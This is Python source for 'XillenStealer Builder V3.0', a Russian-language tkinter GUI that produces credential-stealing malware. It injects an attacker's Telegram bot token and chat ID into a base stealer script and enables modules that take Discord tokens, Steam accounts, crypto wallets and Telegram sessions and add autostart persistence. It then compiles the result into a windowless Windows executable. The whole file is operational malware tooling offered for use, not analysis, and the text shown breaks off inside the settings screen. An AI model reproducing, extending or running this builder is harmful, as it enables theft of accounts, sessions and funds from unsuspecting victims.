import os
import tkinter as tk
from tkinter import messagebox, scrolledtext, filedialog, ttk
import subprocess
import sys
import shutil
import platform
import threading
import hashlib
import json
import tempfile
from PIL import Image, ImageTk
import requests
from io import BytesIO
import time
import math

# Конфигурация
STEALER_DIR = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(__file__)
OUTPUT_DIR = os.path.join(STEALER_DIR, "builds")
BASE_STEALER = os.path.join(STEALER_DIR, "steler.py")
PASSWORD = "layscrab"
VERSION = "3.0"
YEAR = "2025"

# Новый стиль цветов
THEMES = {
    'deep_dark': {
        'primary': '#e5e5e5',
        'primary_light': '#f5f5f5',
        'primary_dark': '#23242a',
        'dark_bg': '#18191d',
        'darker_bg': '#151618',
        'card_bg': '#22232a',
        'text_light': '#e5e5e5',
        'text_lighter': '#ffffff',
        'border_color': '#333333',
        'accent': '#e5e5e5',
        'button_bg': '#23242a',
        'button_fg': '#e5e5e5',
        'button_hover_bg': '#292a33',
        'button_hover_fg': '#ffffff',
        'success': '#00ff88',
        'progress': '#e5e5e5',
        'error': '#ff4444',
        'hover_bg': '#292a33',
        'warning': '#ff8800',
        'main_button_bg': '#23242a',
        'main_button_fg': '#e5e5e5',
        'main_button_hover_bg': '#e5e5e5',
        'main_button_hover_fg': '#23242a',
    },
    'scarlet': {
        'primary': '#ff595e',
        'primary_light': '#ffb3b3',
        'primary_dark': '#1a1013',
        'dark_bg': '#18191d',
        'darker_bg': '#12090b',
        'card_bg': '#1a1013',
        'text_light': '#fff',
        'text_lighter': '#fff',
        'border_color': '#3a1a1a',
        'accent': '#ff595e',
        'button_bg': '#a4161a',
        'button_fg': '#fff',
        'button_hover_bg': '#ba181b',
        'button_hover_fg': '#fff',
        'success': '#00ff88',
        'progress': '#ff595e',
        'error': '#ff4444',
        'hover_bg': '#ba181b',
        'warning': '#ff8800',
        'main_button_bg': '#a4161a',
        'main_button_fg': '#fff',
        'main_button_hover_bg': '#ff595e',
        'main_button_hover_fg': '#1a1013',
    }
}
COLORS = THEMES['deep_dark']

# Импортируем модуль загрузки шрифтов
try:
    from font_loader import get_fonts_with_minecraft
    FONTS = get_fonts_with_minecraft(STEALER_DIR)
    print("Шрифты загружены через font_loader")
except ImportError:
    print("font_loader не найден, используем fallback")
    # Fallback функция
    def get_font():
        try:
            import tkinter.font as tkFont
            temp_root = tk.Tk()
            temp_root.withdraw()
            available_fonts = tkFont.families()
            temp_root.destroy()
            if platform.system() == "Windows":
                if "Segoe UI" in available_fonts:
                    base_font = "Segoe UI"
                elif "Arial" in available_fonts:
                    base_font = "Arial"
                else:
                    base_font = "TkDefaultFont"
            else:
                base_font = "Arial"
            return {
                'main': (base_font, 11),
                'title': (base_font, 28, "bold"),
                'subtitle': (base_font, 18, "bold"),
                'button': (base_font, 11, "bold"),
                'entry': (base_font, 10),
                'log': ("Consolas", 9) if "Consolas" in available_fonts else (base_font, 9)
            }
        except Exception:
            return {
                'main': ("Arial", 11),
                'title': ("Arial", 28, "bold"),
                'subtitle': ("Arial", 18, "bold"),
                'button': ("Arial", 11, "bold"),
                'entry': ("Arial", 10),
                'log': ("Courier New", 9)
            }
    FONTS = get_font()

class ProfessionalButton(tk.Button):
    def __init__(self, parent, **kwargs):
        self.original_bg = kwargs.get('bg', COLORS['button_bg'])
        self.hover_bg = kwargs.get('hover_bg', COLORS['hover_bg'])
        self.original_fg = kwargs.get('fg', COLORS['text_light'])
        self.hover_fg = kwargs.get('hover_fg', COLORS['text_lighter'])
        
        # Убираем hover цвета из kwargs
        kwargs.pop('hover_bg', None)
        kwargs.pop('hover_fg', None)
        
        # Устанавливаем профессиональные параметры по умолчанию
        kwargs.setdefault('relief', 'flat')
        kwargs.setdefault('bd', 0)
        kwargs.setdefault('cursor', 'hand2')
        
        super().__init__(parent, **kwargs)
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        
    def on_enter(self, event):
        self.config(bg=self.hover_bg, fg=self.hover_fg)
        
    def on_leave(self, event):
        self.config(bg=self.original_bg, fg=self.original_fg)

class GradientFrame(tk.Frame):
    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.create_gradient_effect()
        
    def create_gradient_effect(self):
        # Создаем эффект градиента через наложение нескольких фреймов
        pass

class CustomWindow:
    def __init__(self, root):
        self.root = root
        # Используем стандартные Windows кнопки
        self.root.overrideredirect(False)
        self.root.title("XillenStealer Builder V3.0")
        self.root.configure(bg=COLORS['dark_bg'])

class XillenBuilder:
    def __init__(self, root):
        self.root = root
        self.os_type = platform.system()
        self.current_theme = "deep_dark" # "deep_dark" or "scarlet"
        self.selected_modules = {}
        self.animation_running = False
        self.current_view = "auth"  # auth, main, create, settings, about
        
        # Создаем кастомное окно
        self.custom_window = CustomWindow(root)
        
        # Настраиваем интерфейс
        self.setup_auth_ui()

    def setup_auth_ui(self):
        # Размер окна 1000x650, центрирование
        self.root.geometry("1000x650")
        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth() // 2) - (1000 // 2)
        y = (self.root.winfo_screenheight() // 2) - (650 // 2)
        self.root.geometry(f"1000x650+{x}+{y}")
        
        # Шрифты
        self.title_font = FONTS['title']
        self.subtitle_font = FONTS['subtitle']
        self.button_font = FONTS['button']
        self.entry_font = FONTS['entry']
        self.log_font = FONTS['log']

        # Главный контейнер (под кастомной панелью заголовка)
        self.main_container = tk.Frame(self.root, bg=COLORS['dark_bg'])
        self.main_container.pack(fill="both", expand=True, padx=20, pady=20)

        # Показываем экран аутентификации
        self.show_auth_screen()

    def show_auth_screen(self):
        """Показывает экран аутентификации"""
        # Очищаем контейнер
        for widget in self.main_container.winfo_children():
            widget.destroy()

        # Заголовок
        title_frame = tk.Frame(self.main_container, bg=COLORS['dark_bg'])
        title_frame.pack(fill="x", pady=(0, 40))

        # Главный заголовок
        title_label = tk.Label(title_frame,
                             text="XillenStealer Builder",
               font=self.title_font,
                             fg=COLORS['text_lighter'],
                             bg=COLORS['dark_bg'])
        title_label.pack()

        # Версия
        version_label = tk.Label(title_frame,
               text=f"v{VERSION}",
                               font=self.entry_font,
                               fg=COLORS['text_light'],
                               bg=COLORS['dark_bg'])
        version_label.pack(pady=(5, 0))

        # Центральная панель аутентификации
        auth_container = tk.Frame(self.main_container, bg=COLORS['card_bg'], relief="flat", bd=1)
        auth_container.pack(expand=True, fill="both", pady=20)
        
        # Внутренний контейнер
        inner_auth = tk.Frame(auth_container, bg=COLORS['card_bg'])
        inner_auth.pack(expand=True, padx=40, pady=40)

        # Заголовок аутентификации
        auth_header = tk.Frame(inner_auth, bg=COLORS['card_bg'])
        auth_header.pack(pady=(0, 30))

        tk.Label(auth_header,
               text="Аутентификация",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['card_bg']).pack()

        tk.Label(auth_header,
               text="Введите пароль для доступа",
               font=self.entry_font,
               fg=COLORS['text_light'],
               bg=COLORS['card_bg']).pack(pady=(10, 0))

        # Поле ввода пароля
        input_frame = tk.Frame(inner_auth, bg=COLORS['card_bg'])
        input_frame.pack(pady=30)

        # Стилизованное поле ввода
        entry_container = tk.Frame(input_frame, bg=COLORS['border_color'], relief="flat", bd=1)
        entry_container.pack(side=tk.LEFT, padx=(0, 15))

        self.pass_entry = tk.Entry(entry_container,
                                 show="•",
                                 font=self.entry_font,
                                 bg=COLORS['darker_bg'],
                                 fg=COLORS['text_lighter'],
                                 insertbackground=COLORS['accent'],
                                 width=25,
                                 bd=0,
                                 relief="flat")
        self.pass_entry.pack(padx=15, pady=12)
        self.pass_entry.bind("<Return>", lambda e: self.check_password())

        # Профессиональная кнопка входа
        login_btn = ProfessionalButton(input_frame,
                            text="Войти",
                            command=self.check_password,
                                     bg=COLORS['primary'],
                                     fg=COLORS['text_lighter'],
                                     hover_bg=COLORS['primary_light'],
                                     hover_fg=COLORS['text_lighter'],
                            font=self.button_font,
                                     padx=30,
                                     pady=12)
        login_btn.pack(side=tk.LEFT)

        # Футер с информацией об авторах
        footer = tk.Frame(self.main_container, bg=COLORS['dark_bg'])
        footer.pack(fill="x", pady=(20, 0))

        footer_text = tk.Label(footer,
                             text="Разработано командой XillenKillers | @XillenAdapter | @BengaminButton",
                             font=self.entry_font,
                             fg=COLORS['text_light'],
                             bg=COLORS['dark_bg'])
        footer_text.pack()

        # Анимация появления
        self.animate_auth_ui()

    def animate_auth_ui(self):
        """Анимация появления элементов интерфейса"""
        def fade_in_widget(widget, delay=0):
            def animate():
                time.sleep(delay)
                for i in range(10):
                    alpha = i / 10.0
                    # Симуляция fade-in через изменение прозрачности
                    widget.update()
                    time.sleep(0.05)
            threading.Thread(target=animate, daemon=True).start()
        
        # Анимация заголовка
        fade_in_widget(self.root, 0.1)

    def fade_to_screen(self, next_screen_func, duration=200):
        # Плавное исчезновение main_container
        steps = 10
        def fade_out(step=0):
            if step > steps:
                next_screen_func()
                fade_in()
                return
            alpha = 1 - step / steps
            self.main_container.update()
            self.main_container.tk.call(self.main_container._w, 'config', '-background', f'#{int(COLORS["dark_bg"][1:3],16):02x}{int(COLORS["dark_bg"][3:5],16):02x}{int(COLORS["dark_bg"][5:7],16):02x}')
            self.root.after(duration // steps, fade_out, step + 1)
        def fade_in(step=0):
            if step > steps:
                return
            alpha = step / steps
            self.main_container.update()
            self.main_container.tk.call(self.main_container._w, 'config', '-background', f'#{int(COLORS["dark_bg"][1:3],16):02x}{int(COLORS["dark_bg"][3:5],16):02x}{int(COLORS["dark_bg"][5:7],16):02x}')
            self.root.after(duration // steps, fade_in, step + 1)
        fade_out()

    def check_password(self):
        input_hash = hashlib.sha256(self.pass_entry.get().encode()).hexdigest()
        stored_hash = hashlib.sha256(PASSWORD.encode()).hexdigest()
        if input_hash != stored_hash:
            self.pass_entry.config(bg=COLORS['error'])
            self.root.after(500, lambda: self.pass_entry.config(bg=COLORS['darker_bg']))
            messagebox.showerror("Ошибка", "Неверный пароль!")
            return
        # Плавный переход к главному экрану
        self.fade_to_screen(self.transition_to_main_ui)

    def animate_success_transition(self):
        """Анимация успешного входа"""
        def pulse_effect():
            for i in range(3):
                self.root.config(bg=COLORS['success'])
                time.sleep(0.2)
                self.root.config(bg=COLORS['dark_bg'])
                time.sleep(0.2)
        threading.Thread(target=pulse_effect, daemon=True).start()

    def transition_to_main_ui(self):
        """Переход к главному интерфейсу"""
        self.current_view = "main"
        self.show_main_screen()
        self.check_stealer_file()

    def show_main_screen(self):
        """Показывает главный экран"""
        # Очищаем контейнер
        for widget in self.main_container.winfo_children():
            widget.destroy()

        # Верхняя панель
        header = tk.Frame(self.main_container, bg=COLORS['card_bg'], relief="flat", bd=1)
        header.pack(fill="x", pady=(0, 20))

        # Заголовок
        title_frame = tk.Frame(header, bg=COLORS['card_bg'])
        title_frame.pack(side=tk.LEFT, padx=20, pady=15)

        tk.Label(title_frame,
               text="XillenStealer Builder V3.0",
               font=self.title_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['card_bg']).pack(side=tk.LEFT)

        # Кнопки управления
        btn_frame = tk.Frame(header, bg=COLORS['card_bg'])
        btn_frame.pack(side=tk.RIGHT, padx=20, pady=15)

        control_buttons = [
            ("Обновить", self.install_dependencies, COLORS['progress']),
            ("Настройки", lambda: self.show_screen("settings"), COLORS['primary']),
            ("Выход", self.root.destroy, COLORS['error'])
        ]

        for text, command, color in control_buttons:
            btn = ProfessionalButton(btn_frame,
                                   text=text,
                                   command=command,
                                   bg=color,
                                   fg=COLORS['text_lighter'],
                                   hover_bg=COLORS['hover_bg'],
                                   hover_fg=COLORS['text_lighter'],
                                   font=self.button_font,
                                   padx=15,
                                   pady=8)
            btn.pack(side=tk.LEFT, padx=5)

        # Основной контент
        content = tk.Frame(self.main_container, bg=COLORS['dark_bg'])
        content.pack(fill="both", expand=True)

        # Левая панель - навигация
        left_panel = tk.Frame(content, bg=COLORS['card_bg'], width=280)
        left_panel.pack(side=tk.LEFT, fill="y", padx=(0, 15))
        left_panel.pack_propagate(False)

        # Заголовок навигации
        nav_header = tk.Frame(left_panel, bg=COLORS['darker_bg'])
        nav_header.pack(fill="x", pady=(0, 15))

        tk.Label(nav_header,
               text="Навигация",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg']).pack(pady=12)

        # Кнопки навигации
        nav_buttons = [
            ("Создать стиллер", lambda: self.show_screen("create")),
            ("Мои сборки", self.show_stealers),
            ("Статистика", self.show_stats),
            ("Настройки", lambda: self.show_screen("settings")),
            ("О программе", lambda: self.show_screen("about"))
        ]

        for text, command in nav_buttons:
            btn = ProfessionalButton(left_panel,
                          text=text,
                          command=command,
                                   bg=COLORS['button_bg'],
                                   fg=COLORS['text_light'],
                                   hover_bg=COLORS['hover_bg'],
                                   hover_fg=COLORS['text_lighter'],
                          font=self.button_font,
                          padx=35,
                                   pady=12,
                          width=28,
                                   anchor="w")
            btn.pack(pady=5, padx=3, fill="x")

        # Правая панель - лог и информация
        right_panel = tk.Frame(content, bg=COLORS['card_bg'], relief="flat", bd=1)
        right_panel.pack(side=tk.RIGHT, fill="both", expand=True)

        # Статус бар
        status_bar = tk.Frame(right_panel, bg=COLORS['darker_bg'], height=40)
        status_bar.pack(fill="x", pady=(0, 10))
        status_bar.pack_propagate(False)

        status_content = tk.Frame(status_bar, bg=COLORS['darker_bg'])
        status_content.pack(expand=True, fill="both", padx=15, pady=8)

        tk.Label(status_content,
               text="Статус:",
               fg=COLORS['text_light'],
               bg=COLORS['darker_bg'],
               font=self.entry_font).pack(side=tk.LEFT)

        self.status_label = tk.Label(status_content,
                                   text="Готов к работе",
                                   fg=COLORS['accent'],
                                   bg=COLORS['darker_bg'],
                                   font=self.entry_font)
        self.status_label.pack(side=tk.LEFT, padx=(10, 0))

        # Лог
        log_frame = tk.Frame(right_panel, bg=COLORS['darker_bg'])
        log_frame.pack(fill="both", expand=True, padx=15, pady=(0, 15))

        log_header = tk.Frame(log_frame, bg=COLORS['darker_bg'])
        log_header.pack(fill="x", pady=(0, 10))

        tk.Label(log_header,
               text="Журнал сборки:",
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg'],
               font=self.subtitle_font).pack(side=tk.LEFT)

        # Область лога
        self.log_area = scrolledtext.ScrolledText(log_frame,
                                               bg=COLORS['dark_bg'],
                                               fg=COLORS['accent'],
                                               font=self.log_font,
                                               insertbackground=COLORS['accent'],
                                               bd=0,
                                               relief="flat",
                                               padx=15,
                                               pady=10,
                                               wrap=tk.WORD)
        self.log_area.pack(fill="both", expand=True)
        self.log_area.config(state=tk.DISABLED)

        self.log(f"Система: {self.os_type}")
        self.log("Готов к работе")
        self.log("Интерфейс обновлен")

    def show_screen(self, screen_name):
        """Показывает указанный экран"""
        self.current_view = screen_name
        
        if screen_name == "create":
            self.show_create_screen()
        elif screen_name == "settings":
            self.show_settings_screen()
        elif screen_name == "about":
            self.show_about_screen()
        elif screen_name == "main":
            self.show_main_screen()

    def log(self, message):
        try:
            if hasattr(self, 'log_area') and self.log_area:
                self.log_area.config(state=tk.NORMAL)
                self.log_area.insert(tk.END, f"> {message}\n")
                self.log_area.see(tk.END)
                self.log_area.config(state=tk.DISABLED)
            if hasattr(self, 'status_label') and self.status_label:
                self.status_label.config(text=message)
        except Exception:
            pass

    def check_stealer_file(self):
        if not os.path.exists(BASE_STEALER):
            messagebox.showerror("Ошибка", "Файл steler.py не найден!")
            self.root.destroy()
            sys.exit()
        else:
            self.log("Базовый стиллер обнаружен")

    def install_dependencies(self):
        def run_installation():
            self.log("Установка зависимостей...")
            try:
                dependencies = [
                    "pip install pycryptodome",
                    "pip install browser-cookie3",
                    "pip install pillow",
                    "pip install psutil",
                    "pip install pyTelegramBotAPI",
                    "pip install requests",
                ]
                
                if self.os_type == "Windows":
                    dependencies.extend([
                        "pip install pywin32",
                        "pip install pyinstaller"
                    ])
                elif self.os_type == "Linux":
                    dependencies.append("pip install secretstorage")
                
                for cmd in dependencies:
                    self.log(f"Установка: {cmd.split()[2]}")
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.log(f"✓ Успешно: {cmd.split()[2]}")
                    else:
                        self.log(f"✗ Ошибка: {cmd.split()[2]} - {result.stderr.strip()}")
                
                self.log("Все зависимости установлены!")
            except Exception as e:
                self.log(f"Критическая ошибка: {str(e)}")
        
        threading.Thread(target=run_installation, daemon=True).start()

    def show_create_screen(self):
        """Показывает экран создания стиллера"""
        # Очищаем контейнер
        for widget in self.main_container.winfo_children():
            widget.destroy()
            
        # Заголовок
        header = tk.Frame(self.main_container, bg=COLORS['card_bg'], relief="flat", bd=1)
        header.pack(fill="x", pady=(0, 20))

        title_frame = tk.Frame(header, bg=COLORS['card_bg'])
        title_frame.pack(padx=20, pady=15)

        tk.Label(title_frame,
               text="Создание стиллера",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['card_bg']).pack(side=tk.LEFT)

        # Кнопка назад
        back_btn = ProfessionalButton(title_frame,
                                    text="← Назад",
                                    command=lambda: self.show_screen("main"),
                                    bg=COLORS['button_bg'],
                                    fg=COLORS['text_light'],
                                    hover_bg=COLORS['hover_bg'],
                                    hover_fg=COLORS['text_lighter'],
                                    font=self.button_font,
                                    padx=15,
                                    pady=8)
        back_btn.pack(side=tk.RIGHT)

        # Предупреждение для Linux
        if self.os_type == "Linux":
            warning_frame = tk.Frame(self.main_container, bg=COLORS['warning'], relief="flat", bd=1)
            warning_frame.pack(fill="x", pady=(0, 15))
            
            tk.Label(warning_frame,
                   text="⚠️ Внимание: на Linux могут возникнуть проблемы со сборкой!",
                   fg=COLORS['text_lighter'],
                   bg=COLORS['warning'],
                   font=self.entry_font).pack(pady=10)

        # Основной контент
        content = tk.Frame(self.main_container, bg=COLORS['dark_bg'])
        content.pack(fill="both", expand=True)

        # Левая панель - поля ввода
        left_panel = tk.Frame(content, bg=COLORS['card_bg'], relief="flat", bd=1)
        left_panel.pack(side=tk.LEFT, fill="both", expand=True, padx=(0, 10))

        # Поля конфигурации
        config_frame = tk.Frame(left_panel, bg=COLORS['darker_bg'], relief="flat", bd=0)
        config_frame.pack(fill="x", pady=20, padx=20)

        tk.Label(config_frame,
               text="Конфигурация",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg']).pack(pady=15)

        fields = [
            ("Имя стиллера:", "name_entry", "XillenStealer"),
            ("Токен бота:", "token_entry", ""),
            ("ID чата:", "chat_id_entry", "")
        ]
        
        self.entries = {}
        for label, var, placeholder in fields:
            field_frame = tk.Frame(config_frame, bg=COLORS['darker_bg'])
            field_frame.pack(fill="x", pady=10)
            
            tk.Label(field_frame, 
                   text=label, 
                   bg=COLORS['darker_bg'], 
                   fg=COLORS['text_light'],
                   font=self.entry_font).pack(anchor="w", pady=(0, 5))
            
            entry_container = tk.Frame(field_frame, bg=COLORS['border_color'], relief="flat", bd=1)
            entry_container.pack(fill="x")
            
            entry = tk.Entry(entry_container, 
                           bg=COLORS['dark_bg'], 
                           fg=COLORS['text_lighter'],
                           insertbackground=COLORS['accent'],
                           font=self.entry_font,
                           bd=0,
                           relief="flat")
            entry.insert(0, placeholder)
            entry.pack(fill="x", padx=15, pady=12)
            self.entries[var] = entry

        # Правая панель - модули
        right_panel = tk.Frame(content, bg=COLORS['card_bg'], relief="flat", bd=1)
        right_panel.pack(side=tk.RIGHT, fill="both", expand=True, padx=(10, 0))

        modules_frame = tk.Frame(right_panel, bg=COLORS['darker_bg'], relief="flat", bd=0)
        modules_frame.pack(fill="both", expand=True, padx=20, pady=20)

        tk.Label(modules_frame,
               text="Модули",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['darker_bg']).pack(pady=15)

        modules = [
            ("Discord токены", "discord", True),
            ("Steam аккаунты", "steam", True),
            ("Крипто-кошельки", "wallets", True),
            ("Telegram сессии", "telegram", True),
            ("Автозапуск", "autostart", True),
            ("Игровые лаунчеры", "game_launchers", True),
        ]

        self.module_vars = {}
        modules_container = tk.Frame(modules_frame, bg=COLORS['darker_bg'])
        modules_container.pack(fill="both", expand=True, pady=(0, 20))

        for name, key, default in modules:
            var = tk.BooleanVar(value=default)
            self.module_vars[key] = var
            
            module_frame = tk.Frame(modules_container, bg=COLORS['dark_bg'], relief="flat", bd=1)
            module_frame.pack(fill="x", pady=5)
            
            cb = tk.Checkbutton(module_frame,
                              text=name,
                              variable=var,
                              bg=COLORS['dark_bg'],
                              fg=COLORS['text_light'],
                              selectcolor=COLORS['accent'],
                              activebackground=COLORS['dark_bg'],
                              activeforeground=COLORS['text_light'],
                              font=self.entry_font,
                              relief="flat",
                              bd=0)
            cb.pack(anchor="w", padx=15, pady=10)

        # Кнопки управления - исправляем layout
        btn_frame = tk.Frame(self.main_container, bg=COLORS['dark_bg'])
        btn_frame.pack(fill="x", pady=(20, 0), padx=20)
        
        # Центрируем кнопки
        center_frame = tk.Frame(btn_frame, bg=COLORS['dark_bg'])
        center_frame.pack(expand=True)

        buttons = [
            ("Создать", self.build_stealer, COLORS['main_button_bg'], COLORS['main_button_fg'], COLORS['main_button_hover_bg'], COLORS['main_button_hover_fg']),
            ("Сброс", lambda: [e.delete(0, tk.END) for e in self.entries.values()], COLORS['progress'], COLORS['text_lighter'], COLORS['hover_bg'], COLORS['text_lighter']),
            ("Отмена", lambda: self.show_screen("main"), COLORS['error'], COLORS['text_lighter'], COLORS['hover_bg'], COLORS['text_lighter'])
        ]

        for text, command, bg_color, fg_color, hover_bg, hover_fg in buttons:
            btn = ProfessionalButton(center_frame,
                                   text=text,
                                   command=command,
                                   bg=bg_color,
                                   fg=fg_color,
                                   hover_bg=hover_bg,
                                   hover_fg=hover_fg,
                                   font=self.button_font,
                                   padx=30,
                                   pady=12)
            btn.pack(side=tk.LEFT, padx=10)

    def build_stealer(self):
        try:
            name = self.entries["name_entry"].get().strip() or "XillenStealer"
            token = self.entries["token_entry"].get().strip()
            chat_id = self.entries["chat_id_entry"].get().strip()
            
            if not token or not chat_id:
                raise ValueError("Заполните токен и ID чата!")

            with open(BASE_STEALER, "r", encoding="utf-8") as f:
                code = f.read()
            
            # Замена токена и chat_id
            code = code.replace('TG_BOT_TOKEN = "YOUR_BOT_TOKEN"', f'TG_BOT_TOKEN = "{token}"')
            code = code.replace('TG_CHAT_ID = "YOUR_CHAT_ID"', f'TG_CHAT_ID = "{chat_id}"')
            
            # Настройка модулей
            modules_code = "EXTRA_FEATURES = {\n"
            for key, var in self.module_vars.items():
                modules_code += f"    '{key}': {var.get()},\n"
            modules_code += "}\n"
            
            code = code.replace("# ===== CONFIG SECTION =====", f"# ===== CONFIG SECTION =====\n{modules_code}")
            
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            output_path = os.path.join(OUTPUT_DIR, f"{name}.py")
            
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(code)
            
            self.log(f"Стиллер создан: {name}.py")
            
            # --- Новый диалог "Собрать в EXE?" ---
            self._show_compile_overlay(output_path, name)
        except Exception as e:
            messagebox.showerror("Ошибка", str(e))

    def _show_compile_overlay(self, output_path, name):
        # Затемнение фона
        overlay = tk.Frame(self.main_container, bg="#000000", bd=0)
        overlay.place(relx=0, rely=0, relwidth=1, relheight=1)
        overlay.lift()
        overlay.attributes = {'alpha': 0.7}
        
        dialog = tk.Frame(overlay, bg=COLORS['card_bg'], bd=2, relief="ridge")
        dialog.place(relx=0.5, rely=0.5, anchor="center")
        
        tk.Label(dialog, text="Собрать в EXE?", font=self.subtitle_font, fg=COLORS['text_lighter'], bg=COLORS['card_bg']).pack(padx=40, pady=(30, 10))
        
        btn_frame = tk.Frame(dialog, bg=COLORS['card_bg'])
        btn_frame.pack(pady=(0, 30))

        def compile_exe():
            overlay.destroy()
            if self.os_type != "Windows":
                messagebox.showwarning("Ошибка", "Компиляция в EXE доступна только на Windows!")
                return
            threading.Thread(target=self._compile_exe, args=(output_path, name), daemon=True).start()

        def cancel():
            overlay.destroy()
            self.log("Сборка EXE отменена.")

        tk.Button(btn_frame, text="✅ Да", command=compile_exe, bg="#238636", fg="white", font=self.entry_font, padx=20, pady=8).pack(side=tk.LEFT, padx=10)
        tk.Button(btn_frame, text="❌ Нет", command=cancel, bg="#DA3633", fg="white", font=self.entry_font, padx=20, pady=8).pack(side=tk.LEFT, padx=10)

    def _compile_exe(self, path, name):
        try:
            # Создаем прогресс-бар
            progress_frame = tk.Frame(self.main_container, bg=COLORS['card_bg'], relief="flat", bd=1)
            progress_frame.pack(fill="x", pady=20, padx=20)
            
            tk.Label(progress_frame, text="Компиляция в EXE...", font=self.subtitle_font, 
                    fg=COLORS['text_lighter'], bg=COLORS['card_bg']).pack(pady=10)
            
            progress_bar = ttk.Progressbar(progress_frame, mode='indeterminate', length=400)
            progress_bar.pack(pady=10)
            progress_bar.start()
            
            self.log(f"Компиляция {name}.exe...")
            
            # Создание spec файла для правильной компиляции
            spec_content = f"""
# -*- mode: python ; coding: utf-8 -*-
block_cipher = None

a = Analysis(
    ['{path}'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'browser_cookie3',
        'Crypto.Cipher.AES',
        'pyTelegramBotAPI',
        'psutil',
        'PIL.ImageGrab'
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_executable, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='{name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
"""
            spec_path = os.path.join(OUTPUT_DIR, f"{name}.spec")
            with open(spec_path, "w", encoding="utf-8") as f:
                f.write(spec_content)
            
            # Компиляция
            cmd = f'pyinstaller "{spec_path}" --distpath "{OUTPUT_DIR}" --workpath "{os.path.join(OUTPUT_DIR, "build")}" --noconfirm'
            
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    self.log(output.strip())
            
            if process.returncode == 0:
                self.log(f"✓ Успешно: {name}.exe создан!")
                # Очистка
                build_dir = os.path.join(OUTPUT_DIR, "build")
                if os.path.exists(build_dir):
                    shutil.rmtree(build_dir)
                if os.path.exists(spec_path):
                    os.remove(spec_path)
            else:
                self.log("✗ Ошибка компиляции!")
                
        except Exception as e:
            self.log(f"Ошибка компиляции: {str(e)}")
        finally:
            # Останавливаем прогресс-бар
            try:
                progress_bar.stop()
                progress_frame.destroy()
            except:
                pass

    def show_stealers(self):
        if not os.path.exists(OUTPUT_DIR):
            os.makedirs(OUTPUT_DIR)
        
        if self.os_type == "Windows":
            os.startfile(OUTPUT_DIR)
        elif self.os_type == "Linux":
            subprocess.Popen(['xdg-open', OUTPUT_DIR])
        elif self.os_type == "Darwin":
            subprocess.Popen(['open', OUTPUT_DIR])
            
        self.log("Открыта папка builds")

    def show_stats(self):
        stats = {
            "Всего сборок": len([f for f in os.listdir(OUTPUT_DIR) if f.endswith(('.py', '.exe'))]) if os.path.exists(OUTPUT_DIR) else 0,
            "Размер папки builds": self.get_folder_size(OUTPUT_DIR) if os.path.exists(OUTPUT_DIR) else "0 MB",
            "Версия билдера": VERSION,
            "Операционная система": self.os_type
        }
        
        stats_text = "\n".join([f"{k}: {v}" for k, v in stats.items()])
        messagebox.showinfo("Статистика", stats_text)

    def get_folder_size(self, path):
        total = 0
        for entry in os.scandir(path):
            if entry.is_file():
                total += entry.stat().st_size
            elif entry.is_dir():
                total += self._get_folder_size_bytes(entry.path)
        return f"{total / (1024*1024):.2f} MB"

    def _get_folder_size_bytes(self, path):
        total = 0
        for entry in os.scandir(path):
            if entry.is_file():
                total += entry.stat().st_size
            elif entry.is_dir():
                total += self._get_folder_size_bytes(entry.path)
        return total

    def switch_theme(self, theme_name):
        """Переключает тему"""
        if theme_name in THEMES:
            self.current_theme = theme_name
            global COLORS
            COLORS = THEMES[theme_name]
            # Обновляем все элементы интерфейса
            self.update_theme_colors()
        else:
            print(f"Тема {theme_name} не найдена!")
    
    def update_theme_colors(self):
        """Обновляет цвета всех элементов интерфейса"""
        # Обновляем корневое окно
        self.root.configure(bg=COLORS['dark_bg'])
        # Обновляем главный контейнер
        self.main_container.configure(bg=COLORS['dark_bg'])
        # Перерисовываем текущий экран
        if self.current_view == "main":
            self.show_main_screen()
        elif self.current_view == "create":
            self.show_create_screen()
        elif self.current_view == "settings":
            self.show_settings_screen()
        elif self.current_view == "about":
            self.show_about_screen()

    def show_settings_screen(self):
        """Показывает экран настроек - переделанный красивый"""
        # Очищаем контейнер
        for widget in self.main_container.winfo_children():
            widget.destroy()
            
        # Заголовок
        header = tk.Frame(self.main_container, bg=COLORS['card_bg'], relief="flat", bd=1)
        header.pack(fill="x", pady=(0, 20))

        title_frame = tk.Frame(header, bg=COLORS['card_bg'])
        title_frame.pack(padx=20, pady=15)

        tk.Label(title_frame,
               text="Настройки",
               font=self.subtitle_font,
               fg=COLORS['text_lighter'],
               bg=COLORS['card_bg']).pack(side=tk.LEFT)

        # Кнопка назад
        back_btn = ProfessionalButton(title_frame,
                                    text="← Назад",
                                    command=lambda: self.show_screen("main"),
                                    bg=COLORS['button_bg'],
                                    fg=COLORS['text_light'],
                                    hover_bg=COLORS['hover_bg'],
                                    hover_fg=COLORS['text_lighter'],
                                    font=self.button_font,
                                    padx=15,
                                    pady=8)
        back_btn.pack(side=tk.RIGHT)
        
